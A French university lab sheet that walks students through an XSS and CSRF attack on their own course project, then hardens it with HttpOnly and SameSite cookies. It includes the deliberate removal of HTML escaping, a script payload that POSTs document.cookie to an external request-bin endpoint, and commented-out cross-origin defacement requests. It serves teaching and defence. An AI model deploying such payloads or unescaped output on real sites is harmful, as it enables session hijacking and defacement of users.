---
title: Seance SAÉ &ndash; Failles de sécurité
subtitle: XSS, CSRF
layout: tutorial
lang: fr
---

## Bonus pour la SAÉ : Sécurité 

Si vous manquez de temps, appliquez juste la sécurisation des exercices 16 & 17
sans essayer de reproduire les attaques.

### Faille `XSS`

Découvrons 
[la faille de sécurité *Cross Site Scripting* (`XSS`)](https://developer.mozilla.org/fr/docs/Glossary/Cross-site_scripting) sur un exemple.

<div class="exercise">

1. Rendez votre site vulnérable en désactivant l'échappement `htmlspecialchars`.
   Pour ceci, modifiez le code suivant dans `feed.html.twig` : 
   
   ```diff
   - <p>{{ publication.message }}</p>
   + <p>{{ publication.message | raw }}</p>
   ```

   Remarquez par la même occasion que l'utilisation d'un framework professionnel
   protège souvent contre ce genre de vulnérabilité.

1. Rechargez la page. Elle doit afficher un pop-up message si vous avez toujours
   le message original `<script>alert("message")</script>`. Sinon, postez un tel
   message pour voir le pop-up s'afficher.

1. Donc un utilisateur malveillant peut poster un *feed* vérolé, ce qui lui
   permettra d'exécuter du code JavaScript chez tous les visiteurs de *The Feed*. Comme JavaScript a accès aux cookies par défaut, ça devient dangereux.

   [**Créez** un panier à requête public](https://requestbin.com/r) 
   (*request bin* en anglais) pour collecter toutes les requêtes faites à une URL. 
   Enregistrez bien l'URL (*endpoint*) donné et gardez cette page ouverte.

1. Postez le message suivant en remplaçant par votre *endpoint* : 

   ```html
   <script>
      fetch('https://ent4gomyidhlf.x.pipedream.net',{
      body: JSON.stringify(document.cookie),
      method: "POST"
      });
   </script>
   ```

   **Rechargez** la page pour qu'il soit affiché par Twig (et non créé par
   JavaScript). Ce *feed* envoie votre identifiant de session au panier de requête.

1. Il ne reste plus qu'à collecter la requête sur la page Web associée à votre
   *endpoint*. Cliquez sur votre requête qui est apparue à gauche, puis retrouvez votre l'identifiant de session `PHPSESSID` dans les informations sur la requête (corps de requête = *Body*).  

</div>

La première solution a ce problème est donc de bien échapper votre *HTML*. Nous
pouvons aller plus loin en rendant les cookies non accessibles depuis JavaScript. C'est le rôle de [l'attribut `HttpOnly` d'un cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies).

<div class="exercise">

1. Pour protéger notre cookie `auth_token`, activons l'attribut `HttpOnly` à
   tous nos cookies. Dans la classe `Cookie`, changez la méthode `enregistrer()` : 
   
   ```php
   public static function enregistrer(string $cle, mixed $valeur, ?int $dureeExpiration = null): void
   {
      $valeurJSON = serialize($valeur);
      $options = [
         "httponly" => true,
      ];
      if ($dureeExpiration === null)
         $options["expires"] = 0;
      else
         $options["expires"] = time() + $dureeExpiration;
      setcookie($cle, $valeurJSON, $options);
   }
   ```
   
1. Pour protéger notre identifiant de session `PHPSESSID` qui est stocké dans un
   cookie, nous devons utiliser un mécanisme similaire. Dans `Session`, changez le constructeur : 

   ```php
   private function __construct()
   {
      $options = [
         "cookie_httponly" => "1",
      ];
      // session_set_cookie_params($dureeExpiration);
      if (session_start($options) === false) {
         throw new Exception("La session n'a pas réussi à démarrer.");
      }
   }
   ```

1. Supprimez les cookies sur votre site Web en utilisant les outils de
   développement. Reconnectez-vous.  
   **Vérifiez** dans les outils de développement
   que les deux cookies ont l'attribut `HttpOnly` activé.  
   **Exécutez** le code JavaScript suivant dans la console pour vérifier que les
   cookies ne sont plus accessibles : 
   ```js
   document.cookie
   ```

1. Testez que votre site Web marche toujours bien, en particulier les
   fonctionnalités *JavaScript*. Bizarre, non ? C'est le sujet de la prochaine
   section.

2. Vous pouvez remettre `{{ publication.message }}` dans `feed.html.twig`.

</div>

### Faille de sécurité `CSRF`

Comment se fait-il que les fonctionnalités *JavaScript* fonctionnent toujours ?
*JavaScript* envoie des requêtes qui ont besoin d'une authentification via le
cookie `auth_token` pour fonctionner. 

C'est normal que cela marche bien, car même si *JavaScript* n'a plus accès aux
cookies, le navigateur les rajoute aux requêtes faites par `fetch()`.

Ce comportement est malheureusement la base de la faille de sécurité *Cross-Site
Request Forgery* (`CSRF`). Exposons les grandes idées de la faille : 
* dans un navigateur, vous êtes connectés au site de votre banque `https://mabanque.fr`.
  L'authentification se fait par un cookie.
* Dans un autre onglet de votre navigateur, vous allez sur un site malveillant.
  Ce site se sert de JavaScript pour lancer la requête suivante 
  ```
  https://mabanque.fr?action=virement&montant=1000000&beneficiaire=DrEvil 
  ```
* Comme le navigateur rajoute les cookies aux requêtes, votre banque croit que
  l'action vient de vous et transfère l'argent.

Heureusement, les navigateurs modernes ont des défenses contre ce genre
d'attaque. L'idée de base est qu'il ne faut pas rajouter un cookie aux requêtes
si la requête provient d'un domaine différent. Dans l'exemple précédent, le
navigateur n'intégrerait pas les cookies du domaine `mabanque.fr` puisque la
requête provient d'un autre site. Pour votre culture information, cette
problématique a donné lieu à un protocole pour définir la politique de partage
des ressources entre origines multiples : le [*Cross-origin resource sharing*
(CORS)](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS).

Dans le cadre de ce TD, nous allons juste indiquer à nos cookies de n'être rajoutés que lorsque les requêtes viennent du même site.

<div class="exercise">

1. Dans la classe `Cookie`, changez la méthode `enregistrer()` : 
   
   ```diff
     $options = [
        "httponly" => true,
   +    "samesite" => "Strict",
     ];
   ```
   
1. Pour protéger notre identifiant de session `PHPSESSID` qui est stocké dans un
   cookie, nous devons utiliser un mécanisme similaire. Dans `Session`, changez le constructeur : 

   ```diff
     $options = [
        "cookie_httponly" => "1",
   +    "cookie_samesite" => "Strict",
     ];
   ```

</div>

<!-- 
Charger la bonne bibliothèque : 
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"
     integrity="sha256-kLaT2GOSpHechhsozzB+flnD+zUyjE2LlfWPgU04xyI="
     crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"
     integrity="sha256-WBkoXOwTeyKclOHuWtc+i2uENFpDZ9YPdf5Hf+D7ewM="
     crossorigin=""></script>
 -->

<!-- #### (Bonus) Exemple pratique

Difficile à mettre en place car il faut désactiver beaucoup de sécurités

Requête à faire depuis la console dans le site `https://www.google.com` (exemple)

```js
fetch(
   'http://localhost/~lebreton/ComplementWeb2223/TD3_tentative/web/api/feeds',
   {
      mode: 'cors',
      method: 'POST',
      body: JSON.stringify({message : "Owned ! Defaced !"}),
      credentials: 'include'
   }
);
```

`RouteurURL`
```php
$route = new Route("/api/feeds", [
   "_controller" => ['publication_controleur_api', "afficherListe"],
]);
$route->setMethods(["GET", "OPTIONS"]);
```

et plus loin dans `RouteurURL`

```php
$reponse->headers->add([
   'Access-Control-Allow-Origin' => 'https://www.google.com',
   'Access-Control-Allow-Credentials' => 'true'
]);
```
   
`Cookie` pour `auth_token` : 
```php
$options = [
   "httponly" => true,
   "samesite" => "None",
   "secure" => true
];
``` 
-->

<!-- 
TODO : Essayer l'attaque où {{message | raw}} et 
fetch(
   'http://localhost/~lebreton/ComplementWeb2223/TD3_tentative/web/api/feeds/api/feeds',
   {
      method: 'POST',
      body: JSON.stringify({message : "Owned ! Defaced !"}),
   }
);

Solution : CSRF token !

-->


<!-- 

JWT dans les cookies pour que le JS ne puisse pas le lire : 
* Utilisez des cookies HttpOnly et Secure : Lorsque vous utilisez des cookies pour stocker des JWT, veillez à activer les drapeaux HttpOnly et Secure. L'indicateur HttpOnly empêche les scripts côté client d'accéder au cookie et l'indicateur Secure garantit que le cookie n'est envoyé que sur des connexions HTTPS.

  En gros, un utilisateur malicieux qui exécuterait du JS dans votre site (via injection HTML), pourrais lire les cookies autrement avec document.cookie

* On peut quand même lancer des requêtes qui envoient le cookie
  avec fetch par exemple 
* rajouter SameSite=strict pour ne pas pouvoir qu'un utilisateur malicieux envoie une requête sur un autre site (honeypot ? voir N. Aragon https://www.root-me.org/fr/Challenges/ )
  https://stackoverflow.com/questions/61062419/where-and-how-save-token-jwt-best-practice
* stocker juste idUtilisateur signé côté client, et le reste côté serveur (pourquoi ?)
  https://dev.to/rdegges/please-stop-using-local-storage-1i04

-->

<!-- 
cookie_samesite
type: string or null default: 'lax'

Elle contrôle la manière dont les cookies sont envoyés lorsque la requête HTTP ne provient pas du même domaine que celui associé aux cookies. Il est recommandé de définir cette option pour atténuer les attaques de sécurité CSRF.

Par défaut, les navigateurs envoient tous les cookies liés au domaine de la requête HTTP. Cela peut poser problème, par exemple, lorsque vous visitez un forum et qu'un commentaire malveillant contient un lien tel que https://some-bank.com/?send_money_to=attacker&amount=1000. Si vous étiez précédemment connecté au site web de votre banque, le navigateur enverra tous ces cookies lors de cette requête HTTP.

Les valeurs possibles pour cette option sont les suivantes :

null, utilisez-la pour désactiver cette protection. Même comportement que dans les anciennes versions de Symfony.
none" (ou la constante Symfony\Component\HttpFoundation\Cookie::SAMESITE_NONE), utilisez-la pour autoriser l'envoi de cookies lorsque la requête HTTP provient d'un domaine différent (auparavant, c'était le comportement par défaut de null, mais dans les navigateurs plus récents, "lax" serait appliqué lorsque l'en-tête n'a pas été défini).
'strict' (ou la constante Cookie::SAMESITE_STRICT), à utiliser pour ne jamais envoyer de cookie lorsque la requête HTTP ne provient pas du même domaine.
'lax' (ou la constante Cookie::SAMESITE_LAX), l'utiliser pour autoriser l'envoi de cookies lorsque la requête provient d'un domaine différent, mais uniquement lorsque l'utilisateur a consciemment fait la demande (en cliquant sur un lien ou en soumettant un formulaire avec la méthode GET).

cookie_secure
type: boolean or 'auto' default: 'auto'

Cette valeur détermine si les cookies doivent être envoyés uniquement via des connexions sécurisées. Outre true et false, il existe une valeur spéciale "auto" qui signifie true pour les requêtes HTTPS et false pour les requêtes HTTP.

cookie_httponly
type: boolean default: true

Cette option détermine si les cookies doivent être accessibles uniquement via le protocole HTTP. Cela signifie que le cookie ne sera pas accessible par les langages de script, tels que JavaScript. Ce paramètre peut contribuer efficacement à réduire l'usurpation d'identité par le biais d'attaques XSS.
https://symfony.com/doc/current/reference/configuration/framework.html#session

-->

<!-- https://github.com/dwyl/learn-json-web-tokens#q-if-i-put-the-jwt-in-the-url-or-header-is-it-secure -->

<!-- JWT Handbook -->